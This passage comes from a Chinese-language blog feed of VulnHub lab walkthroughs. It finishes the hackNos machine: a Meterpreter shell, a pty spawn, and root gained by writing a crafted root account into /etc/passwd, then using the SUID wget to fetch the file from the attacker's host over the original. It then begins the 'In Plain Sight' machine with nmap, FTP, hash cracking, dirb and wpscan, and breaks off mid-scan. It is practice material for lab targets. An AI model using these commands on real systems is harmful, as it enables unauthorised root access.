UPGRADE.txt</span><br><span class="line">100777/rwxrwxrwx  6604    fil   2018-02-21 12:28:43 -0500  authorize.php</span><br><span class="line">100777/rwxrwxrwx  720     fil   2018-02-21 12:28:43 -0500  cron.php</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  includes</span><br><span class="line">100777/rwxrwxrwx  529     fil   2018-02-21 12:28:43 -0500  index.php</span><br><span class="line">100777/rwxrwxrwx  703     fil   2018-02-21 12:28:43 -0500  install.php</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  misc</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  modules</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  profiles</span><br><span class="line">100777/rwxrwxrwx  2189    fil   2018-02-21 12:28:43 -0500  robots.txt</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  scripts</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  sites</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  themes</span><br><span class="line">100777/rwxrwxrwx  19986   fil   2018-02-21 12:28:43 -0500  update.php</span><br><span class="line">100777/rwxrwxrwx  2200    fil   2018-02-21 12:28:43 -0500  web.config</span><br><span class="line">100777/rwxrwxrwx  417     fil   2018-02-21 12:28:43 -0500  xmlrpc.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">/var/www/html/drupal</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2203 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@hackNos:/var/www/html/drupal$ ls</span><br><span class="line">ls</span><br><span class="line">CHANGELOG.txt       INSTALL.txt      authorize.php  misc        sites</span><br><span class="line">COPYRIGHT.txt       LICENSE.txt      cron.php       modules     themes</span><br><span class="line">INSTALL.mysql.txt   MAINTAINERS.txt  includes       profiles    update.php</span><br><span class="line">INSTALL.pgsql.txt   README.txt       index.php      robots.txt  web.config</span><br><span class="line">INSTALL.sqlite.txt  UPGRADE.txt      install.php    scripts     xmlrpc.php</span><br><span class="line">www-data@hackNos:/var/www/html/drupal$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@hackNos:/var/www/html/drupal$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@hackNos:/var/www/html/drupal$</span><br></pre></td></tr></table></figure>

<p>找到第一个flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hackNos:/var/www/html/drupal$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">www-data@hackNos:/home$ ls</span><br><span class="line">ls</span><br><span class="line">james</span><br><span class="line">www-data@hackNos:/home$ <span class="built_in">cd</span> james</span><br><span class="line"><span class="built_in">cd</span> james</span><br><span class="line">www-data@hackNos:/home/james$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">www-data@hackNos:/home/james$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">   _                                  </span><br><span class="line">  | |                                 </span><br><span class="line"> / __) ______  _   _  ___   ___  _ __ </span><br><span class="line"> \__ \|______|| | | |/ __| / _ \| <span class="string">&#x27;__|</span></span><br><span class="line"><span class="string"> (   /        | |_| |\__ \|  __/| |   </span></span><br><span class="line"><span class="string">  |_|          \__,_||___/ \___||_|   </span></span><br><span class="line"><span class="string">                                      </span></span><br><span class="line"><span class="string">                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span></span><br><span class="line"><span class="string">www-data@hackNos:/home/james$</span></span><br></pre></td></tr></table></figure>

<h3 id="提权，找到第二个flag"><a href="#提权，找到第二个flag" class="headerlink" title="提权，找到第二个flag"></a>提权，找到第二个flag</h3><p>使用SUID检查文件查找命令，看到输出/usr/bin/wget 有SUID权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hackNos:/home/james$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/i386-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/wget</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/fusermount</span><br></pre></td></tr></table></figure>

<p>进入/etc/passwd并将此文件复制到本地系统，并使用openSSL生成新密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># openssl passwd -1 -salt lucifer11 passwd                                                                                    </span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$lucifer1</span><span class="variable">$TOAYpZO4bCfctvslb57pP</span>.</span><br></pre></td></tr></table></figure>

<p>将生成的hash值放入passwd中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucifer11:<span class="variable">$1</span><span class="variable">$lucifer1</span><span class="variable">$TOAYpZO4bCfctvslb57pP</span>.:0:0:,,,/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub85.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>

<p>在shell中下载并替换passwd文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hackNos:/etc$ wget http://192.168.56.102:8000/passwd -O passwd</span><br><span class="line">wget http://192.168.56.102:8000/passwd -O passwd</span><br><span class="line">--2019-12-23 09:00:24--  http://192.168.56.102:8000/passwd</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1687 (1.6K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"></span><br><span class="line">passwd              100%[===================&gt;]   1.65K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2019-12-23 09:00:24 (405 MB/s) - <span class="string">&#x27;passwd&#x27;</span> saved [1687/1687]</span><br></pre></td></tr></table></figure>

<p>成功下载并替换,然后登录root用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@hackNos:/etc$ su lucifer11</span><br><span class="line">su lucifer11</span><br><span class="line">Password: passwd</span><br><span class="line"></span><br><span class="line">bash: /bin/bash/.bashrc: Not a directory</span><br><span class="line">root@hackNos:/etc<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@hackNos:/etc<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>找到flag,帅掉渣</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@hackNos:/etc<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@hackNos:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@hackNos:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">    _  _                              _   </span><br><span class="line">  _| || |_                           | |  </span><br><span class="line"> |_  __  _|______  _ __  ___    ___  | |_ </span><br><span class="line">  _| || |_|______|| <span class="string">&#x27;__|/ _ \  / _ \ | __|</span></span><br><span class="line"><span class="string"> |_  __  _|       | |  | (_) || (_) || |_ </span></span><br><span class="line"><span class="string">   |_||_|         |_|   \___/  \___/  \__|</span></span><br><span class="line"><span class="string">                                          </span></span><br><span class="line"><span class="string">                                          </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author : Rahul Gehlaut</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Linkedin : https://www.linkedin.com/in/rahulgehlaut/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Blog : www.hackNos.com</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub86.jpg"></p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[In-Plain-Sight-1-0-1]</title>
    <url>/2020/01/10/In-Plain-Sight-1-0-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：In Plain Sight: 1.0.1<br>发布日期：2019年12月2日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOUJaa0FOTUpETDQyMUtraUhWZVBsemMzT2Ezd3d6SFUvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/19BZkANMJDL421KkiHVePlzc3Oa3wwzHU/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9pbnBsYWluc2lnaHQvaW5wbGFpbnNpZ2h0MS5vdmE=">https://download.vulnhub.com/inplainsight/inplainsight1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9pbnBsYWluc2lnaHQvaW5wbGFpbnNpZ2h0MS5vdmEudG9ycmVudA==">https://download.vulnhub.com/inplainsight/inplainsight1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>级别：初学者-中级<br>说明：使用VirtualBox构建/测试。启用DHCP。需要root才能读取flag</p>
<ul>
<li>Changelog 2019-12-02：v1.0.1 2019-11-22：v1.0</li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.108</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:48:A5:6E (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -v -sV -Pn 192.168.56.108</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ftp 192.168.56.108</span></span><br><span class="line">Connected to 192.168.56.108.</span><br><span class="line">220 IPS Corp</span><br><span class="line">Name (192.168.56.108:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp           306 Nov 22 13:42 todo.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cat todo.txt</span><br><span class="line">?Invalid <span class="built_in">command</span></span><br><span class="line">ftp&gt; get todo.txt</span><br><span class="line"><span class="built_in">local</span>: todo.txt remote: todo.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> todo.txt (306 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">306 bytes received <span class="keyword">in</span> 0.02 secs (14.9999 kB/s)</span><br><span class="line">ftp&gt; quit</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat todo.txt </span></span><br><span class="line">mike - please get ride of that worthless wordpress instance! it<span class="string">&#x27;s a security ris</span></span><br><span class="line"><span class="string">k.  if you have privilege issues, please ask joe for assitance.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">joe - stop leaving backdoors on the system or your access will be removed! y</span></span><br><span class="line"><span class="string">our rabiit holes aren&#x27;</span>t enough <span class="keyword">for</span> these elite cyber hacking types.</span><br><span class="line"></span><br><span class="line">- boss person</span><br></pre></td></tr></table></figure>

<p>没有什么有用的信息，继续寻找敏感信息</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub149.jpg"></p>
<p>注意是index.htnl，打开此页面，随便点击一个地方</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub150.jpg"></p>
<p>出现如下的上传页面</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub151.jpg"></p>
<p>可以看到，该网页允许上传任何图像。因此，这里尝试上传图像，但成功了，但是当尝试上传.php文件时，网页给了一个错误。在进一步探索之后，该网页的URL引起了注意，可以看到它看起来像一个hash，因此我们将其复制并尝试使用john对其进行破解。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># john pass</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-SHA1-AxCrypt&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-SHA1-AxCrypt&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;Raw-SHA1-Linkedin&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=Raw-SHA1-Linkedin&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;Raw-SHA1&quot;</span>, but the string is also recognized as <span class="string">&quot;ripemd-160&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=ripemd-160&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-SHA1 [SHA1 256/256 AVX2 8x])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=4</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">goodluck         (?)</span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2020-01-12 20:31) 20.00g/s 3680p/s 3680c/s 3680C/s emily..iceman</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-SHA1&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>john破解hash的结果是：goodluck<br>在这一点上，我们只是被拖钓了。然后，我们尝试上传一个简单的.php文件，而在上传.php文件时，我们遇到以下错误：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub152.jpg"></p>
<p>但是这个错误导致我们进入了新页面“upload.php”。让我们检查此页面的源代码</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub153.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--ZmxvY2NpbmF1Y2luaWhpbGlwaWxpZmljYXRpb24K--&gt;</span><br></pre></td></tr></table></figure>

<p>源代码末尾有一个注释。这是base64编码的文本，因此，使用以下命令对其进行解码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo ZmxvY2NpbmF1Y2luaWhpbGlwaWxpZmljYXRpb24K | base64 -d</span></span><br><span class="line">floccinaucinihilipilification</span><br></pre></td></tr></table></figure>

<p>不知道为什么这里解密字符串和结果和别人的walkthrough不一样，别人的是c28tZGV2LXdvcmRwcmVzcw==，解密出来是so-dev-wordpress</p>
<p>文本解码后，看起来像目录或网页。但是在探索之前，先看看是否有更多的页面。因此，使用dirbuster。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.108/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Jan 12 20:42:40 2020</span><br><span class="line">URL_BASE: http://192.168.56.108/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.108/ ----</span><br><span class="line">+ http://192.168.56.108/index.html (CODE:200|SIZE:10918)                                              </span><br><span class="line">+ http://192.168.56.108/info.php (CODE:200|SIZE:84111)                                                </span><br><span class="line">+ http://192.168.56.108/server-status (CODE:403|SIZE:279)                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/                                                       </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/index.php (CODE:301|SIZE:0)                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-content/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-includes/                                           </span><br><span class="line">+ http://192.168.56.108/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                       </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/css/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/images/                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/includes/                                     </span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/js/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/maint/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/network/                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/user/                                         </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-content/index.php (CODE:200|SIZE:0)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-content/plugins/                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-content/themes/                                     </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                        </span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                        </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                           </span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                      </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0) </span><br></pre></td></tr></table></figure>

<p>有很多页面，结果显示CMS是wordpress，因此，可以使用wpscan浏览提到wordpress的两个指定页面。为此，请使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/wordpress/ --enumerate</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.6</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://192.168.56.108/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Sun Jan 12 20:45:08 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.3 identified (Insecure, released on 2019-11-12).</span></span><br><span class="line"><span class="string"> | Found By: Emoji Settings (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.108/wordpress/, Match: &#x27;</span>wp-includes\/js\/wp-emoji-release.min.js?ver=5.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> | Confirmed By: Meta Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.108/wordpress/, Match: &#x27;</span>WordPress 5.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] The main theme could not be detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No plugins Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:00 &lt;=======================&gt; (320 / 320) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No themes Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:01 &lt;=====================&gt; (2568 / 2568) 100.00% Time: 00:00:01</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Timthumbs Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:00 &lt;==========================&gt; (21 / 21) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking DB Exports - Time: 00:00:00 &lt;==============================&gt; (36 / 36) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No DB Exports Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span></span><br><span class="line"><span class="string"> Brute Forcing Attachment IDs - Time: 00:00:00 &lt;===================&gt; (100 / 100) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Medias Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] 